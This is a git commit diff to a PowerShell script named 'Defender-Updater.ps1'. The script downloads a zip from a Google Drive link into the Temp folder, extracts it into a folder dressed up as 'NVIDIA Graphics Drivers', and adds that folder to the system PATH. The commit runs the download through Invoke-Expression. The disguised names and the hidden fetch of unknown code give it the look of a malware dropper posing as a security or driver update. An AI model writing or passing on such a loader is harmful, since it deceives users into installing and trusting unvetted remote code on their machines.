ec58a42285f64be99ca164afa9bd53fe7a0f3323
Rugved Mahamune <quad.powered@gmail.com>
2024-07-27 11:45:30 +0100

    Update Defender-Updater.ps1

--- Defender-Updater.ps1
+++ Defender-Updater.ps1
@@ -1,6 +1,8 @@
 $username=[Environment]::UserName
 $zipFile = "https://drive.usercontent.google.com/download?id=1K4-RNWLveLMlXeYNxhU_ixOJqPkUto75&export=download&authuser=0&confirm=t&uuid=c7cf249b-eae8-4c05-9b54-cc31c1965923&at=APZUnTW1V4_b7EfRKpngGHmZ3E_p:1722069362432"
-cmd /c curl $zipFile --output "C:\Users\$username\AppData\Local\Temp\updater.zip"
+$op = "C:\Users\$username\AppData\Local\Temp\updater.zip"
+$x="curl '$zipFile' --output '$op'" 
+Invoke-Expression $x
 Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Users\Program Files\NVIDIA Graphics Drivers"
 $Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
 [Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
